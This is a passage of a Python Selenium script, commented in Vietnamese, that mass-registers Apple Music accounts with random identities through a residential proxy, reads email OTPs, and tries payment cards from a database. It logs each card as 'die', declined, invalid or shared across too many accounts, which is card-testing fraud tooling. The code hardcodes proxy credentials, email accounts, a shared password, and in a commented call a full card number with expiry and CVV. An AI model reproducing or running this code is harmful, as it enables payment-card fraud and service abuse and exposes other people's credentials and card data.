            print(add_payment_result.text)
            match add_payment_result.text:
                case tool_exception.DISSABLE:
                    # logging.error("Error Account: Id - %s", str(data[0][1] +" - "+"Account is disable"))
                    # db_instance.update_data(table_name="mail", set_values={"status": 0, "exception": "Diss"}, condition=f"id = {data[0][0]}")
                    run_add_card = False # Dừng vì account bị disable
                    browser.quit()
                case tool_exception.MANY:
                    logging.error("Error Card: Cardnumber - %s", str(data_card[0][1] +" - "+"Card is many account add"))
                    db_instance.update_data(table_name="pay", set_values={"status": 0, "exception": "To Many ID"}, condition=f"id = {data_card[0][0]}")
                    wait.until(EC.visibility_of_element_located((By.XPATH, "/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button")))
                    browser.find_element(By.XPATH, "/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button").click()
                case tool_exception.INVALID_CARD:
                # Thông tin thẻ sai
                    logging.error("Error Card: Cardnumber - %s", str(data_card[0][1] +" - "+"Card is invalid"))
                    db_instance.update_data(table_name="pay", set_values={"status": 0, "exception": "Invalid Card"}, condition=f"id = {data_card[0][0]}")
                    wait.until(EC.visibility_of_element_located((By.XPATH, "/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button")))
                    browser.find_element(By.XPATH, "/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button").click()
                    continue
                case tool_exception.SUPPORT:
                    logging.error("Error Card: Cardnumber - %s", str(data_card[0][1] +" - "+"Card is support"))
                    db_instance.update_data(table_name="pay", set_values={"status": 0, "exception": "contact suport"}, condition=f"id = {data_card[0][0]}")
                    wait.until(EC.visibility_of_element_located((By.XPATH, "/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button")))
                    browser.find_element(By.XPATH, "/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button").click()
                    continue
                case tool_exception.DIE:
                    logging.error("Die Card: Cardnumber - %s", str(data_card[0][1] +" - "+"Card is die"))
                    db_instance.update_data(table_name="pay", set_values={"status": 0, "exception": "Die"}, condition=f"id = {data_card[0][0]}")
                    wait.until(EC.visibility_of_element_located((By.XPATH, "/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button")))
                    browser.find_element(By.XPATH, "/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button").click()
                    continue
                case tool_exception.ACC_SPAM:
                    # logging.error("Error Account: Id - %s", str(data[0][1] +" - "+"Account is spam"))
                    # db_instance.update_data(table_name="mail", set_values={"status": 0, "exception": "add sup"}, condition=f"id = {data[0][0]}")
                    db_instance.update_data(table_name="pay", set_values={"status": 0, "exception": "add sup"}, condition=f"id = {data_card[0][0]}")
                    db_instance.insert_mail_wait(mail_wait=data['account'])
                    run_add_card = False
                    browser.quit()
                    # continue
                case tool_exception.ISSUE_METHOD:
                    logging.error("Error Card: Id - %s", str(data_card[0][1] +" - "+"Card Die"))
                    db_instance.update_data(table_name="pay", set_values={"status": 0, "exception": "Die"}, condition=f"id = {data_card[0][0]}")
                    wait.until(EC.visibility_of_element_located((By.XPATH, "/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button")))
                    browser.find_element(By.XPATH, "/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button").click()
                    continue
                case tool_exception.DEC:
                    logging.error("Error Card: Id - %s", str(data_card[0][1] +" - "+"Card DEC"))
                    db_instance.update_data(table_name="pay", set_values={"status": 0, "exception": "DEC"}, condition=f"id = {data_card[0][0]}")
                    wait.until(EC.visibility_of_element_located((By.XPATH, "/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button")))
                    browser.find_element(By.XPATH, "/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button").click()
                    continue
                case tool_exception.DECLINED:
                    logging.error("Error Card: Id - %s", str(data_card[0][1] +" - "+"Card DEC"))
                    # db_instance.update_data(table_name="pay", set_values={"status": 0, "exception": "DEC"}, condition=f"id = {data_card[0][0]}")
                    wait.until(EC.visibility_of_element_located((By.XPATH, "/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button")))
                    browser.find_element(By.XPATH, "/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button").click()
                    continue
                case _:
                    logging.error("Error Card: Lỗi không xác định - %s", str(add_payment_result.text))
        except NoSuchElementException as e:
            logging.error("Error Card: Thông tin thẻ không hợp lệ - %s")
            db_instance.update_data(table_name="pay", set_values={"status": 0, "exception": "Invalid Card"}, condition=f"id = {data_card[0][0]}")
            continue
        # wait.until(EC.visibility_of_element_located((By.XPATH, "/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button")))
        # browser.find_element(By.XPATH, "/html/body/div[1]/div/div/camk-modal/div/camk-modal-button-bar/camk-button-bar/div/div[2]/button").click()

        except Exception as e: # Không có thông báo. => Add thẻ thành công
            run_add_card = False
            db_instance.update_data(table_name="pay", set_values={"number_use": data_card[0][6]+1}, condition=f"id = {data_card[0][0]}")
            if data['type'] == 'wait':
                db_instance.update_data(table_name="mail_reg_apple_music_wait", set_values={"status": "Y"}, condition=f"mail = '{data['account']}'")
            data['card_number'] = card.get_card_number()
            data['month_exp'] = data_card[0][2]
            data['year_exp'] = data_card[0][3]
            data['ccv'] = card.get_card_ccv()
            break
    # Tiến hành hoàn thành
    apple_id_done(browser, data)
    

def reg_apple_music():
    first_name, last_name, date_of_birth, password = random_data()
    data = None
    address1, address2, city, state, postalCode = random_address()
    type_mail = None
    try:
        mail, type_mail = generate_random_email()
        data = {
        "first_name": first_name,
        "account": mail,
        "type": type_mail,
        # "account": "leblancmylie373@gmail.com",
        "password": "Zxcv123123",
        "last_name": last_name,
        "date_of_birth": date_of_birth,
        "address1": address1,
        "address2": address2,
        "city": city,
        "state": state,
        "postalCode": postalCode
        }
        print(data)
    except:
        print("error")
    
    option = {
        'proxy':  
            {
                'https': 'https://brd-customer-hl_d346dd25-zone-static-country-us:jmkokxul20oa@brd.superproxy.io:22225'
            }
    
    }
    
    browser = webdriver.Firefox(
        seleniumwire_options=option
    )
    
    browser.get('https://music.apple.com/us/login')
    wait = WebDriverWait(browser, 10)
    # vào web 
    try:
        wait.until(EC.visibility_of_element_located((By.CSS_SELECTOR,  "#ck-container > iframe")))
        iframe = browser.find_element(By.CSS_SELECTOR, value= "#ck-container > iframe")
        browser.switch_to.frame(iframe)
        
        #Nhập account name
        wait.until(EC.visibility_of_element_located((By.ID, "accountName")))
        inputAccount = browser.find_element(By.ID, "accountName")
        inputAccount.send_keys(data["account"])
        
        # Nhấn nút login
        browser.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div/div[2]/div/div/div[3]/button").click()
        # time.sleep(10)
        # WebDriverWait(browser, 10).until(EC.visibility_of_element_located((By.CSS_SELECTOR, "#aid-auth-widget-iFrame")))
        # iframe_auth = browser.find_element(By.CSS_SELECTOR, "#aid-auth-widget-iFrame")
        # browser.switch_to.frame(iframe_auth)
    except Exception as e:
        print(e)
        
    time.sleep(5) # Đợi 5s

    # Kiểm tra login 
    try: 
        browser.switch_to.default_content()
        WebDriverWait(browser, 10).until(EC.visibility_of_element_located((By.XPATH, "/html/body/div/div[5]/iframe")))
        iframe_register = browser.find_element(By.XPATH, "/html/body/div/div[5]/iframe")
        browser.switch_to.frame(iframe_register)
        WebDriverWait(browser, 10).until(EC.visibility_of_element_located((By.ID, "acAccountPassword")))
        browser.find_element(By.ID, "acAccountPassword").send_keys(data["password"])
        WebDriverWait(browser, 10).until(EC.visibility_of_element_located((By.ID, "firstName")))
        browser.find_element(By.ID, "firstName").send_keys(data["first_name"])
        WebDriverWait(browser, 10).until(EC.visibility_of_element_located((By.ID, "lastName")))
        browser.find_element(By.ID, "lastName").send_keys(data["last_name"])
        WebDriverWait(browser, 10).until(EC.visibility_of_element_located((By.ID, "birthday")))
        birth = browser.find_element(By.ID, "birthday")
        print(birth.tag_name)
        for i in data["date_of_birth"]:
            time.sleep(0.2)
            birth.send_keys(i)
        # WebDriverWait(browser, 10).until(EC.visibility_of_element_located((By.CLASS_NAME, 'form-checkbox create-account-v2__checkbox')))
        
        inputs = browser.find_elements(By.TAG_NAME, "input")
        # print(inputs[inputs.__len__()-1].get_attribute("id"))
        inputs[inputs.__len__()-1].click()   
        WebDriverWait(browser, 10).until(EC.visibility_of_element_located((By.XPATH, "/html/body/div[1]/div/div/div/div/div[3]/div/button[2]")))
        browser.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div/div[3]/div/button[2]").click()
    except Exception as e:
        print('Đã login')
        print(e)
        if data['type'] == 'wait':
            db_instance.update_data(table_name="mail_reg_apple_music_wait", set_values={"status": "N"}, condition=f"mail = '{data['account']}'")
        try: 
            process_login(browser, data)
        except Exception as e:
            print(e)
            browser.quit()
            sys.exit(0)
        browser.quit()
        return 
    otp = getOTP(data["account"])
    time.sleep(5)
    otp = getOTP(data["account"])
    active_element = browser.switch_to.active_element
    active_element.send_keys(otp)
    time.sleep(8)
    browser.get("https://music.apple.com/us/account/settings")
    WebDriverWait(browser, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div/div[4]/main/div/div/iframe')))
    iframe_hello = browser.find_element(By.XPATH, '/html/body/div/div[4]/main/div/div/iframe')
    browser.switch_to.frame(iframe_hello)
    WebDriverWait(browser, 10).until(EC.visibility_of_element_located((By.XPATH, '/html/body/div[1]/div/div/div/main/div/div/div/div/div[5]/div/div[2]/div/div/div/div[5]/button')))
    browser.find_element(By.XPATH, '/html/body/div[1]/div/div/div/main/div/div/div/div/div[5]/div/div[2]/div/div/div/div[5]/button').click()
    time.sleep(3)
    browser.switch_to.default_content()
    browser.get("https://music.apple.com/us/account/settings")
    # time.sleep(3)
    
    add_payment(browser, data)
    
    
    
    
    
    
#===================================GUI=========================================
# root = Tk()
# root.title("Tool apple music")
# root.withdraw()  # Ẩn cửa sổ chính ban đầu

# # Lấy kích thước màn hình
# screen_width = root.winfo_screenwidth()
# screen_height = root.winfo_screenheight()

# # Đặt cửa sổ vào giữa màn hình
# app_width = 400
# app_height = 300
# x = (screen_width - app_width) // 2
# y = (screen_height - app_height) // 2
# root.geometry(f"{app_width}x{app_height}+{x}+{y}")

# # Ẩn cửa sổ chính ban đầu
# root.withdraw()
# frame_app = Frame(root, bg="white", width=root.winfo_width())
# analysis_frame = Frame(root, bg="white", width=root.winfo_width())
# # Hiển thị hình ảnh
# image_path = "./assets/images/main-background.png"
# image = Image.open(image_path)
# photo = ImageTk.PhotoImage(image)
# image_label = Label(root, image=photo)
# image_label.place(relx=0.5, rely=0.5, anchor="center")

# # Hiển thị cửa sổ chính
# root.deiconify()

# # Tạo menu
# menu = Menu(root)
# root.config(menu=menu)

# add_data_menu = Menu(menu)
# menu.add_cascade(label='Thêm dữ liệu', menu=add_data_menu)
# add_data_menu.add_command(label='Thêm id', command=add_id)
# add_data_menu.add_command(label='Thêm thẻ', command=add_card)
# add_data_menu.add_separator()

# featuremenu = Menu(menu)
# menu.add_cascade(label='Chức năng', menu=featuremenu)
# featuremenu.add_command(label='Login check', command=run_app_check)
# featuremenu.add_command(label='Login check xoá thẻ', command=run_app_delete)
# featuremenu.add_command(label='Login add', command=run_app)
# featuremenu.add_separator()
# featuremenu.add_command(label='Reg apple music', command=reg_apple_music)

# analysis_menu = Menu(menu)
# menu.add_cascade(label='Thống kê', menu=analysis_menu)
# analysis_menu.add_command(label='Xuất id thành công', command=export_success_id)
# analysis_menu.add_command(label='Xuất id không thành công', command=open_analysis)
# analysis_menu.add_command(label='Xuất thẻ thành công', command=export_success_pay)
# analysis_menu.add_command(label='Xuất thẻ thất bại', command=open_error_pay)
# analysis_menu.add_command(label='Xuất thẻ thẻ login check', command=export_login_check_id)
# analysis_menu.add_command(label='Xuất thẻ thẻ login delete', command=export_login_delete_id)

# setting_menu = Menu(menu)
# menu.add_cascade(label='Cài đặt', menu=setting_menu)
# setting_menu.add_command(label='Mở tool', command=open_tool)
# setting_menu.add_command(label='Dừng tool', command=close_tool)

# exit_menu = Menu(menu)
# menu.add_cascade(label='Exit', menu=exit_menu)
# exit_menu.add_command(label='Exit', command=close_app)

# mainloop()

# option = {
#         'proxy':  
#             {
#                 'https': 'https://brd-customer-hl_d346dd25-zone-static-country-us:jmkokxul20oa@brd.superproxy.io:22225'
#             }
    
#     }
    
# browser = webdriver.Firefox(
#     seleniumwire_options=option
# )

# browser.get('https://music.apple.com/us/account/settings')
# apple_id_done(browser,{'first_name': 'Nsysf', 'account': 'tandatvo91@gmail.com', 'type': 'rent', 'password': 'Zxcv123123', 'last_name': 'Zaesa', 'date_of_birth': '07051969', 'address1': '2034 Fairfax Road', 'address2': '', 'city': 'Annapolis', 'state': 'MD', 'postalCode': '21401', 'card_number': '4403938038007684', 'month_exp': '10', 'year_exp': '2024', 'ccv': '187'})

reg_apple_music()
# click_first_login(browser)
# add_payment(browser,{'first_name': 'Clvof', 'account': 'leblancmylie373@gmail.com', 'password': 'Zxcv123123', 'last_name': 'Pnrme', 'date_of_birth': '08151999', 'address1': '12245 West 71st Place', 'address2': '', 'city': 'Arvada', 'state': 'CO', 'postalCode': '80004'} )
# time.sleep(40)
# add_payment(browser,{'first_name': 'Jveuw', 'account': 'proctorbyron7@gmail.com', 'password': 'Zxcv123123', 'last_name': 'Evnea', 'date_of_birth': '08221974', 'address1': '8 Village Circle', 'address2': '', 'city': 'Randolph', 'state': 'VT', 'postalCode': '05060'} )
# reg_apple_music()
# process_login(browser, {'account': 'proctorbyron7@gmail.com', 'password': 'Zxcv123123'})

